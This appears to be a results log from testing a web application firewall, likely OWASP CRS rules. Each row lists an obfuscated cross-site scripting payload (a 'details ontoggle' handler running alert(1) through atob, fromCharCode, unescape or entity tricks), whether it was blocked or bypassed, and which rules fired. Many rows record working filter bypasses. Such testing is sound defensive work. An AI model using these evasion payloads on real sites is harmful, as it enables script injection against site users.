1199,"<details open ontoggle='(new/**/Function(atob(""YWxlcnQoMSk="")))()'>",0,1,bypass,2,"941100,941120","v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603424716.186194
1202,"<details open ontoggle='(new Function(window.atob(""YWxlcnQoMSk="")))()'>",0,1,block,4,"934100,941100,941120,949110","o25,13v217,71 || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603425098.114835
1204,"<details open ontoggle='(new Function(atob(String.fromCharCode(89,87,120,108,99,110,81,111,77,83,107,61))))()'>",0,1,block,4,"934100,941100,941120,949110","o25,13v217,111 || v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603425276.723911
1205,"<details open ontoggle='(new Function(atob&#x28;""YWxlcnQoMSk=""&#x29;))()'>",0,1,block,4,"934100,941100,941120,949110","o25,13v217,74 || v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603425349.843364
1206,<details open ontoggle='(new Function(atob`YWxlcnQoMSk=`))()'>,0,1,block,4,"934100,941100,941120,949110","o25,13v216,62 || v216,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603425436.908335
1207,"<details open ontoggle='(new Function(self.atob(""YWxlcnQoMSk="")))()'>",0,1,block,4,"934100,941100,941120,949110","o25,13v217,69 || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603425561.771461
1211,"<details open ontoggle='(new Function(atob(String.fromCharCode(0x59,0x57,0x78,0x6c,0x63,0x6e,0x51,0x6f,0x4d,0x53,0x6b,0x3d))))()'>",0,1,block,4,"934100,941100,941120,949110","o25,13v217,130 || v217,130t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,130t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603425951.914326
1212,"<details open ontoggle='(new Function(atob(""YW""+""xlcnQoMSk="")))()'>",0,1,block,5,"934100,934100,941100,941120,949110","o25,13v217,67 || o25,13v217,67t:urlDecodeUni || v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603426044.279360
1214,"<details open ontoggle='(new Function(atob([""YW"",""xlcnQ"",""oMSk=""].join(""""))))()'>",0,1,block,4,"934100,941100,941120,949110","o25,13v217,81 || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603426236.010551
1215,"<details open ontoggle='(new Function(globalThis.atob(""YWxlcnQoMSk="")))()'>",0,1,block,4,"934100,941100,941120,949110","o25,13v217,75 || v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603426361.293227
1216,"<details open ontoggle='(new Function(atob(unescape(""YWxlcnQoMSk=""))))()'>",0,1,block,4,"934100,941100,941120,949110","o25,13v217,74 || v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17760342642.324252
1217,"<details open ontoggle='(new Function([...atob(""YWxlcnQoMSk="")].join("""")))()'>",0,1,block,4,"934100,941100,941120,949110","o25,13v217,78 || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603426510.083109
1225,<details open ontoggle='Function(`al`+`ert(1)`)()'>,0,1,block,4,"941100,941120,942100,949110","v216,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v216,51 || ",15,177603427340.410792
1226,"<details open ontoggle='Function(""al\u0065rt(1)"")()'>",0,1,block,4,"941100,941120,942100,949110","v216,53t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,53t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v216,53 || ",15,177603427423.826969
1228,"<details open ontoggle='Function.prototype.constructor.call(null,""al""+""ert(1)"")()'>",0,1,bypass,2,"941100,941120","v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603427676.631486
1230,"<details open ontoggle='globalThis[""Function""](""al""+""ert(1)"")()'>",0,1,block,4,"933210,941100,941120,949110","o34,29v217,65t:urlDecode,t:replaceComments,t:compressWhitespace || v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603427886.958107
1231,"<details open ontoggle='Function(atob(""YWxlcnQoMSk=""))()'>",0,1,bypass,2,"941100,941120","v216,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17760342799.435989
1232,"<details open ontoggle='Function(""al\x65rt(1)"")()'>",0,1,block,4,"941100,941120,942100,949110","v216,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v216,51 || ",15,177603428028.757570
1233,"<details open ontoggle='parent[""Function""](""al""+""ert(1)"")()'>",0,1,block,4,"933210,941100,941120,949110","o30,29v217,61t:urlDecode,t:replaceComments,t:compressWhitespace || v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603428179.089585
1234,"<details open ontoggle='Function(String.fromCharCode(97,108,101,114,116,40,49,41))()'>",0,1,block,4,"934100,941100,941120,949110","o33,19v217,86 || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603428269.522453
1235,"<details open ontoggle='Object.getPrototypeOf(async function(){}).constructor(""al""+""ert(1)"")()'>",0,1,block,5,"934100,934100,941100,941120,949110","o52,11v217,96 || o52,11v217,96t:urlDecodeUni || v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603428321.241875
1236,"<details open ontoggle='Function(""ale""+""rt""+""(1)"")()'>",0,1,block,5,"941100,941120,942100,942100,949110","v217,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,54 || v217,54t:urlDecodeUni || ",20,177603428417.038316
1237,"<details open ontoggle='(function(){}).constructor(""al""+""ert(1)"")()'>",0,1,block,5,"934100,934100,941100,941120,949110","o25,11v217,69 || o25,11v217,69t:urlDecodeUni || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603428553.354432
1239,<details open ontoggle='Function(atob(&quot;YWxlcnQoMSk=&quot;))()'>,0,1,bypass,2,"941100,941120","v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603428775.309880
1240,<details open ontoggle='Function(&quot;al&quot;+&quot;ert(1)&quot;)()'>,0,1,bypass,2,"941100,941120","v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603428944.799742
1242,<details open ontoggle='window[&quot;Function&quot;](&quot;\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029&quot;)()'>,0,1,block,4,"941100,941120,941370,949110","v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,28v217,118t:urlDecodeUni,t:compressWhitespace || ",15,177603429192.413235
1244,<details open ontoggle='Function(&quot;&#0097;&#0108;&#0101;&#0114;&#0116;&#0040;&#0049;&#0041;&quot;)()'>,0,1,bypass,2,"941100,941120","v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603429384.261628
1245,<details open ontoggle='Function(`&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;`)()'>,0,1,block,4,"941100,941120,942100,949110","v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,84 || ",15,177603429428.648701
1246,<details open ontoggle='(function(){}).constructor(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()'>,0,1,block,4,"934100,941100,941120,949110","o25,11v217,112 || v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603429559.749228
1251,"<details open ontoggle='self[&quot;Function&quot;](String.fromCharCode(97,108,101,114,116,40,49,41))()'>",0,1,block,5,"934100,941100,941120,941370,949110","o51,19v217,104 || v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,26v217,104t:urlDecodeUni,t:compressWhitespace || ",20,177603430079.976968
1254,<details open ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029&quot;).call()'>,0,1,bypass,2,"941100,941120","v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603430323.714573
1255,<details open ontoggle='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#x31;&#41;&quot;).apply()'>,0,1,bypass,2,"941100,941120","v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603430477.276140
1257,"<details open ontoggle='Function(String[""fromCharCode""](97,108,101,114,116,40,49,41))()'></details>",0,1,block,4,"933210,941100,941120,949110","o32,55v217,99t:urlDecode,t:replaceComments,t:compressWhitespace || v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603430680.419471
1258,"<details open ontoggle='Function(atob(""YWxlcnQoMSk=""))()'></details>",0,1,bypass,2,"941100,941120","v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603430726.719521
1262,"<details open ontoggle='Function(String.fromCodePoint(97,108,101,114,116,40,49,41))()'></details>",0,1,bypass,2,"941100,941120","v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603431196.081965
1265,"<details open ontoggle='Function(String[`fromCharCode`](97,108,101,114,116,40,49,41))()'></details>",0,1,bypass,2,"941100,941120","v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603431491.778172
1266,"<details open ontoggle='Function(eval(atob(""YWxlcnQoMSk="")))()'></details>",0,1,block,5,"933160,934100,941100,941120,949110","o33,29v217,74 || o33,5v217,74 || v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,17760343154.007991
1268,"<details open ontoggle='Function([97,108,101,114,116,40,49,41].map(c=>String.fromCharCode(c)).join``)()'></details>",0,1,block,4,"934100,941100,941120,949110","o70,19v217,115 || v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603431773.724033
1269,"<details open ontoggle='Function(String.fromCharCode(...[97,108,101,114,116,40,49,41]))()'></details>",0,1,block,4,"934100,941100,941120,949110","o33,19v217,101 || v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17760343184.047148
1271,"<details open ontoggle='Function(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,0x28,0x31,0x29))()'></details>",0,1,block,4,"934100,941100,941120,949110","o33,19v217,108 || v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603432019.526611
1272,"<details open ontoggle='Function([String.fromCharCode(97),String.fromCharCode(108),String.fromCharCode(101),String.fromCharCode(114),String.fromCharCode(116),String.fromCharCode(40),String.fromCharCode(49),String.fromCharCode(41)].join``)()'></details>",0,1,block,4,"934100,941100,941120,949110","o34,19v217,252 || v217,252t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,252t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603432151.863648
1274,"<details open ontoggle='Function(unescape(""%61%6c%65%72%74%28%31%29""))()'></details>",0,1,bypass,2,"941100,941120","v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17760343248.451412
1275,"<details open ontoggle='Function(decodeURI(""%61%6c%65%72%74%28%31%29""))()'></details>",0,1,bypass,2,"941100,941120","v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603432546.926710
1276,<details open ontoggle='Function(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+String.fromCharCode(40)+String.fromCharCode(49)+String.fromCharCode(41))()'></details>,0,1,block,5,"934100,934100,941100,941120,949110","o33,19v217,243 || o33,19v217,243t:urlDecodeUni || v217,243t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,243t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603432660.567962
1278,"<details open ontoggle='top[""Function""](atob(""YWxlcnQoMSk=""))()'></details>",0,1,block,5,"933210,941100,941120,941370,949110","o27,36v217,75t:urlDecode,t:replaceComments,t:compressWhitespace || v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,15v217,75t:urlDecodeUni,t:compressWhitespace || ",20,177603432866.760977
1281,"<details open ontoggle='Function(String.fromCharCode(97,108,101,114,116,40,49,41))()'></details>",0,1,block,4,"934100,941100,941120,949110","o33,19v217,96 || v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603433196.228981
1282,"<details open ontoggle='Function(atob(String.fromCharCode(89,87,120,108,99,110,81,111,77,83,107,61)))()'></details>",0,1,block,4,"934100,941100,941120,949110","o38,19v217,115 || v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603433282.117175
1286,<details open ontoggle='Function(atob(`YWxlcnQoMSk=`))()'></details>,0,1,bypass,2,"941100,941120","v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603433623.439917
1291,"<details open ontoggle='Function(atob(""YWxlcnQoMSk=""))/**/()'></details>",0,1,bypass,2,"941100,941120","v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603434114.306224
1292,"<details open ontoggle='Function/**/(atob/**/(/**/""YWxlcnQoMSk=""/**/)/**/)/**/()'></details>",0,1,bypass,2,"941100,941120","v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603434219.961841
1294,"<details open ontoggle='globalThis[""Function""](atob(""YWxlcnQoMSk=""))()'></details>",0,1,block,4,"933210,941100,941120,949110","o34,36v217,82t:urlDecode,t:replaceComments,t:compressWhitespace || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603434496.810439
1295,"<details open ontoggle='(()=>Function(atob(""YWxlcnQoMSk=""))())()'></details>",0,1,bypass,2,"941100,941120","v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603434561.102288
1296,"<details open ontoggle='Function(unescape(""%61%6C%65%72%74%28%31%29""))()'></details>",0,1,bypass,2,"941100,941120","v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603434671.401261
1297,"<details open ontoggle='Function(decodeURI(""%61%6C%65%72%74%28%31%29""))()'></details>",0,1,bypass,2,"941100,941120","v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603434767.861000
1298,"<details open ontoggle='Function(atob(""YWxlcnQoMSk""))()'></details>",0,1,bypass,2,"941100,941120","v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603434980.924209
1300,"<details open ontoggle='self[""Function""](unescape(""%61%6C%65%72%74%28%31%29""))()'></details>",0,1,block,6,"933210,941100,941120,941370,942100,949110","o28,36v217,92t:urlDecode,t:replaceComments,t:compressWhitespace || v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,16v217,92t:urlDecodeUni,t:compressWhitespace || v217,92 || ",25,177603435188.152871
1301,"<details open ontoggle='window[""Function""](unescape(""%61%6C%65%72%74%28%31%29""))()'></details>",0,1,block,6,"933210,941100,941120,941370,942100,949110","o30,36v217,94t:urlDecode,t:replaceComments,t:compressWhitespace || v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,18v217,94t:urlDecodeUni,t:compressWhitespace || v217,94 || ",25,177603435282.015345
1304,<details open ontoggle='Function(unescape`%61%6C%65%72%74%28%31%29`)()'></details>,0,1,bypass,2,"941100,941120","v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603435588.053083
1305,"<details open ontoggle='Function(decodeURIComponent(""%61%6C%65%72%74%28%31%29""))()'></details>",0,1,bypass,2,"941100,941120","v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603435650.368802
1306,"<details open ontoggle='top[""Function""](String.fromCharCode(97,108,101,114,116,40,49,41))()'></details>",0,1,block,6,"933210,934100,941100,941120,941370,949110","o27,64v217,103t:urlDecode,t:replaceComments,t:compressWhitespace || o40,19v217,103 || v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,15v217,103t:urlDecodeUni,t:compressWhitespace || ",25,177603435736.769866
1307,"<details open ontoggle='parent[""Function""](unescape(""%61%6C%65%72%74%28%31%29""))()'></details>",0,1,block,5,"933210,941100,941120,942100,949110","o30,36v217,94t:urlDecode,t:replaceComments,t:compressWhitespace || v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,94 || ",20,177603435849.366399
1308,"<details open ontoggle='Function(unescape(""%61%6C%65%72%74(1)""))()'></details>",0,1,block,4,"941100,941120,942100,949110","v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,78 || ",15,177603435919.176708
1309,"<details open ontoggle='Function(unescape(""%61""+""%6C""+""%65""+""%72""+""%74""+""(1)""))()'></details>",0,1,bypass,2,"941100,941120","v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603436055.545321
1312,"<details open ontoggle='Function(eval(unescape(""%61%6C%65%72%74%28%31%29"")))()'></details>",0,1,block,6,"933160,934100,934100,941100,941120,949110","o33,45v217,90 || o33,5v217,90 || o33,5v217,90t:urlDecodeUni || v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603436371.592047
1314,"<details open ontoggle='new Function(String.fromCharCode(97,108,101,114,116,40,49,41))()'></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,100 || v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603436639.529392
1315,"<details open ontoggle='new Function(atob(""YWxlcnQoMSk=""))()'></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,72 || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603436740.972879
